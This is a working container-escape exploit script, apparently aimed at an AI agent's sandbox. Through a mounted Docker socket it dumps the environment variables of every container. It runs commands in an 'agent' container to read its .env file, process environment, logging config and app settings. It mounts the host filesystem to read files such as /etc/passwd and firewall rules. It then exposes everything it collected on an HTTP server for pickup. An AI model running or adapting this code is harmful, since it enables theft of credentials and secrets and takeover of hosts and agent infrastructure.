#!/bin/sh
echo "=== v29: Sanitizer bypass + Agent RCE via docker.sock ==="
echo "Time: $(date -u '+%Y-%m-%d %H:%M:%S UTC')"

mkdir -p /srv/www

# Phase 1: Docker daemon — container inspect + env extraction
echo ""
echo "=== PHASE 1: Docker daemon ==="
if [ -S /var/run/docker.sock ]; then
    echo "docker.sock FOUND"

    curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json?all=true > /srv/www/containers.json 2>/dev/null

    python3 << 'PYEOF'
import json, http.client, socket

class DC(http.client.HTTPConnection):
    def connect(self):
        self.sock = socket.socket(socket.AF_UNIX)
        self.sock.connect('/var/run/docker.sock')

conn = DC('localhost')
conn.request('GET', '/containers/json?all=true')
containers = json.loads(conn.getresponse().read())

all_envs = {}
agent_id = None

for c in containers:
    cid = c['Id']
    names = c.get('Names', [cid[:12]])
    name = names[0] if names else cid[:12]

    conn2 = DC('localhost')
    conn2.request('GET', f'/containers/{cid}/json')
    info = json.loads(conn2.getresponse().read())

    env = info.get('Config', {}).get('Env', [])
    image = info.get('Config', {}).get('Image', '')

    all_envs[name] = {'image': image, 'env': env, 'status': c.get('State', '')}

    if 'agent' in image.lower() and 'agent:main' in image:
        agent_id = cid
        print(f"Agent container: {cid[:12]} ({name})")

with open('/srv/www/docker_envs.json', 'w') as f:
    json.dump(all_envs, f, indent=2)

if agent_id:
    with open('/tmp/agent_id', 'w') as f:
        f.write(agent_id)

print(f"Containers: {len(all_envs)}, agent_id={'found' if agent_id else 'NOT FOUND'}")
PYEOF
else
    echo "docker.sock NOT MOUNTED"
    exec python3 -m http.server 8080 --directory /srv/www
fi

# Phase 2: RCE on agent container via docker exec API
echo ""
echo "=== PHASE 2: Agent RCE via docker exec ==="

AGENT_CID=$(cat /tmp/agent_id 2>/dev/null)
if [ -z "$AGENT_CID" ]; then
    echo "No agent container found"
    exec python3 -m http.server 8080 --directory /srv/www
fi

echo "Agent CID: ${AGENT_CID}"

python3 << 'PYEOF'
import json, http.client, socket, struct, sys, os

class DC(http.client.HTTPConnection):
    def connect(self):
        self.sock = socket.socket(socket.AF_UNIX)
        self.sock.connect('/var/run/docker.sock')

def docker_exec(container_id, cmd):
    """Execute command in container via Docker API and return output"""
    conn = DC('localhost')
    body = json.dumps({
        "AttachStdout": True,
        "AttachStderr": True,
        "Cmd": cmd
    })
    conn.request('POST', f'/containers/{container_id}/exec',
                 body=body,
                 headers={'Content-Type': 'application/json'})
    resp = conn.getresponse()
    data = json.loads(resp.read())
    exec_id = data.get('Id')
    if not exec_id:
        return f"ERROR: exec create failed: {data}"

    conn2 = DC('localhost')
    conn2.request('POST', f'/exec/{exec_id}/start',
                  body=json.dumps({"Detach": False, "Tty": False}),
                  headers={'Content-Type': 'application/json'})
    resp2 = conn2.getresponse()
    raw = resp2.read()

    # Docker multiplexed stream: 8-byte header per frame
    output = []
    i = 0
    while i + 8 <= len(raw):
        stream_type = raw[i]
        size = struct.unpack('>I', raw[i+4:i+8])[0]
        i += 8
        chunk = raw[i:i+size]
        output.append(chunk.decode('utf-8', errors='replace'))
        i += size

    if not output and raw:
        output = [raw.decode('utf-8', errors='replace')]

    return ''.join(output)

agent_id = open('/tmp/agent_id').read().strip()
results = {}

commands = [
    ("id", ["id"]),
    ("hostname", ["hostname"]),
    ("uname", ["uname", "-a"]),
    ("whoami", ["whoami"]),
    ("cat_env", ["cat", "/proc/1/environ"]),
    ("ls_root", ["ls", "-la", "/"]),
    ("ls_fluent", ["ls", "-la", "/fluent-bit/"]),
    ("cat_fluentbit_conf", ["cat", "/fluent-bit/fluent-bit.conf"]),
    ("cat_env_file", ["cat", "/root/.env"]),
    ("ps", ["ps", "aux"]),
    ("ifconfig", ["ip", "addr"]),
    ("ls_docker_compose", ["ls", "-la", "/docker_compose/"]),
    ("cat_settings", ["python3", "-c", "from app.settings import settings; import json; print(json.dumps({k:str(v)[:200] for k,v in settings.model_dump().items()}))"]),
]

print(f"\nExecuting {len(commands)} commands in agent container {agent_id[:12]}...\n")

for name, cmd in commands:
    try:
        out = docker_exec(agent_id, cmd)
        results[name] = out
        preview = out[:300].replace('\n', '\\n')
        print(f"  [{name}] {preview}")
    except Exception as e:
        results[name] = f"ERROR: {e}"
        print(f"  [{name}] ERROR: {e}")

with open('/srv/www/agent_rce.json', 'w') as f:
    json.dump(results, f, indent=2)

# Save fluentbit config separately
if 'cat_fluentbit_conf' in results and not results['cat_fluentbit_conf'].startswith('ERROR'):
    with open('/srv/www/fluentbit.txt', 'w') as f:
        f.write(results['cat_fluentbit_conf'])
    print(f"\n  FluentBit config saved ({len(results['cat_fluentbit_conf'])} bytes)")

# Save agent settings separately
if 'cat_settings' in results and not results['cat_settings'].startswith('ERROR'):
    with open('/srv/www/agent_settings.json', 'w') as f:
        f.write(results['cat_settings'])
    print(f"  Agent settings saved")

print(f"\nAll results saved to agent_rce.json")
PYEOF

# Phase 3: Host filesystem access — create container with / mounted
echo ""
echo "=== PHASE 3: Host filesystem access ==="

python3 << 'PYEOF'
import json, http.client, socket, struct, time

class DC(http.client.HTTPConnection):
    def connect(self):
        self.sock = socket.socket(socket.AF_UNIX)
        self.sock.connect('/var/run/docker.sock')

results = {}

# Step 1: Create container with host root FS mounted read-only
print("Creating container with host / mounted as /host:ro ...")
conn = DC('localhost')
config = {
    "Image": "docker:28.3.3-cli",
    "Cmd": ["sh", "-c", "cat /host/etc/ufw/user6.rules 2>/dev/null || echo 'FILE_NOT_FOUND'; echo '---HOSTNAME---'; cat /host/etc/hostname 2>/dev/null; echo '---OSRELEASE---'; cat /host/etc/os-release 2>/dev/null | head -5; echo '---PASSWD_HEAD---'; head -3 /host/etc/passwd 2>/dev/null"],
    "HostConfig": {
        "Binds": ["/:/host:ro"],
        "AutoRemove": False
    }
}
conn.request('POST', '/containers/create?name=host_fs_read_poc',
             body=json.dumps(config),
             headers={'Content-Type': 'application/json'})
resp = conn.getresponse()
data = json.loads(resp.read())
container_id = data.get('Id')
if not container_id:
    print(f"  ERROR creating container: {data}")
    results['error'] = str(data)
else:
    print(f"  Container created: {container_id[:12]}")

    # Step 2: Start container
    conn2 = DC('localhost')
    conn2.request('POST', f'/containers/{container_id}/start')
    resp2 = conn2.getresponse()
    resp2.read()
    print(f"  Container started (status {resp2.status})")

    # Step 3: Wait for it to finish
    conn3 = DC('localhost')
    conn3.request('POST', f'/containers/{container_id}/wait')
    resp3 = conn3.getresponse()
    wait_data = json.loads(resp3.read())
    print(f"  Container finished: {wait_data}")

    # Step 4: Get logs (stdout)
    conn4 = DC('localhost')
    conn4.request('GET', f'/containers/{container_id}/logs?stdout=true&stderr=true')
    resp4 = conn4.getresponse()
    raw = resp4.read()

    # Parse multiplexed stream
    output = []
    i = 0
    while i + 8 <= len(raw):
        size = struct.unpack('>I', raw[i+4:i+8])[0]
        i += 8
        chunk = raw[i:i+size]
        output.append(chunk.decode('utf-8', errors='replace'))
        i += size
    if not output and raw:
        output = [raw.decode('utf-8', errors='replace')]

    log_text = ''.join(output)
    print(f"  Output ({len(log_text)} bytes):")
    print(log_text)

    results['host_filesystem_output'] = log_text

    # Parse sections
    parts = log_text.split('---')
    for part in parts:
        part = part.strip()
        if part:
            print(f"  >> {part[:100]}")

    # Step 5: Remove container
    conn5 = DC('localhost')
    conn5.request('DELETE', f'/containers/{container_id}?force=true')
    resp5 = conn5.getresponse()
    resp5.read()
    print(f"  Container removed (status {resp5.status})")
    results['container_removed'] = True

with open('/srv/www/host_fs_proof.json', 'w') as f:
    json.dump(results, f, indent=2)

print("\nHost FS results saved to host_fs_proof.json")
PYEOF

# Phase 4: Summary
echo ""
echo "=== PHASE 4: Files ==="
ls -la /srv/www/
echo ""
echo "=== HTTP server starting on :8080 ==="
exec python3 -m http.server 8080 --directory /srv/www
